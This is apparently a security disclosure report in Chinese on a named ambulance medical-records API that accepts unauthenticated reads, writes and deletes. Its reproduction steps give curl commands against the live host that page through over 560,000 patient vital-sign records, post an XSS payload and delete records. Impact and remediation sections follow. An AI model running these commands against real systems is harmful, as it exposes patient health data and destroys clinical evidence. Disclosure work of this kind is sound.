## Description

目标 `https://epcr.tpf.gov.tw:4001/events`（EPCR 医疗 PCDT 系统的 vitalSignVideoServer）完全无认证层。任意 HTTP 客户端无需提供任何凭据/Cookie/JWT 即可访问以下端点：
- GET /events → 200 OK + Content-Range 直接暴露 `items 0-99/567239`（PostgreSQL/Sequelize 弱 ETag 分页），全表 56 万+ 条 PHI 数据可遍历，字段含 CaseID/recordUuid/Caption/TypeOfEventTxt/Systolic/Diastolic/Mean/Timestamp/Elapsed/BPUnit/Annotation 等生命体征临床数据
- GET /events/:id → 200 OK 单条无鉴权读取（id=567246 旧 PoC 至今存活）
- POST /events (application/json) → 201 Created 无鉴权写入
- DELETE /events/:id → 200 OK `{}` 无鉴权物理删除（实测删除后 Content-Range 立刻回落）
- PATCH/PUT /events/:id → 404 Express 路由未注册（篡改能力缺失，攻击者只能用 DELETE+POST 替代，造成不可审计的"幽灵"篡改）

响应头显示无 Content-Security-Policy，且启用 x-xss-protection: 0；ETag 弱 W/&quot;xxx-...&quot; 暴露 Express 框架；Vary: Origin 暗示曾考虑过 CORS 但未实施；HSTS/max-age 启用但前端无 CSP。

## Reproduction

1. 准备：任意 HTTP 客户端（curl/Browser/Postman），无需 Cookie/Token/IP 白名单
2. 复现 NOAUTH 列表泄露：执行 `curl -i https://epcr.tpf.gov.tw:4001/events`，观察 200 + content-range: items 0-99/567239；遍历 `?offset=0&limit=100` → `?offset=567200&limit=40` 可拉取全表 567239 条 PHI
3. 复现 NOAUTH Stored XSS 残留：执行 `curl https://epcr.tpf.gov.tw:4001/events/567246`，观察 Annotation 字段仍存活的旧 svg/onload payload
4. 复现 NOAUTH 写：执行 `curl -X POST -H 'Content-Type: application/json' -d '{"CaseID":"TEST_OWNER","recordUuid":"TEST","Caption":"X","TypeOfEventTxt":"X","Annotation":"<img src=x onerror=alert(1)>"}' https://epcr.tpf.gov.tw:4001/events`，观察 201 Created + location: /events/&lt;新id&gt;
5. 复现 NOAUTH 删：执行 `curl -X DELETE https://epcr.tpf.gov.tw:4001/events/&lt;新id&gt;`，观察 200 + {} 2B；二次 GET 同 ID 应返 404，且列表 Content-Range -1
6. 复现篡改 405：执行 `curl -X PATCH -H 'Content-Type: application/json' -d '{"Annotation":"x"}' https://epcr.tpf.gov.tw:4001/events/567246` 与 `curl -X PUT ...`，观察均 404

## Impact

该端点构成 CRITICAL 级医疗数据完全失控：
1. **PHI 大规模泄露**：56 万+ 条救护车生命体征事件（PCDT 临床记录）明文返回，无任何 ACL/CASL/角色控制；CaseID/recordUuid/Caption/Annotation 字段直接暴露患者身份与临床处置流程
2. **数据可写/可删**：急救车传输到医院的临床事件可被任意覆盖（已观察到 id=100 HACKED、id=567204-567205 SQLi、id=567248 MirrorTest8888、id=567249 PENTEST-PROBE-001 等历史染指）
3. **司法证据完整性破坏**：DELETE 200 无审计/无记录/无软删除，物理删除事件证据，直接破坏医疗纠纷举证链
4. **HIPAA/GDPR 严重违规**：技术 + 管理双重失守；恶意攻击者仅需浏览器即可用 POST + DELETE 任意制造或销毁救护车生命体征事件
5. **与 4004 全局 express-jwt 防御形成强对比**：同一 EPCR 系统的认证子域 4004 全站受 JWT 保护，但 4001 业务子域完全 NOAUTH，攻击者完全可以绕过主域鉴权

## Recommendation

1. **加认证层**（最紧迫）：在 vitalSignVideoServer:4001 之前强制接入 4004 authServer JWT 全局中间件；至少校验 `Authorization: Bearer <jwt>` 或 `?token=` 与 roles[].indexOf('HOSPITAL'|'ADMIN') !== -1；业务端点拒绝任何未鉴权访问
2. **关闭无认证 CRUD**：POST/DELETE 必须基于身份与角色；强制字段级权限（如 HOSPITAL 只能写自己的 CaseID）
3. **审计日志**：所有 CRUD 操作落 trace 日志，包含 user/role/IP/timestamp/payload diff/前后内容，DELETE 必须软删除并保留 90 天回收窗口
4. **敏感字段最小化**：移除 recordUuid/Annotation 等自由文本字段的对外暴露；仅返回必要字段（TypeOfEventTxt + BP 数值即可）
5. **HTTP 安全响应头**：补 Content-Security-Policy: default-src 'self'; object-src 'none'; frame-ancestors 'none'，关闭 x-xss-protection: 0，启用 X-Frame-Options: DENY
6. **强 ETag**：用强 ETag（hex 内容哈希）替代弱 ETag
7. **隐藏内部计数**：移除 Content-Range 头或仅向认证用户返回
8. **注册完整路由**：PUT/PATCH 若不被业务支持，应显式返回 405 Method Not Allowed 而不是 404 Express 默认页（避免路由指纹泄露）
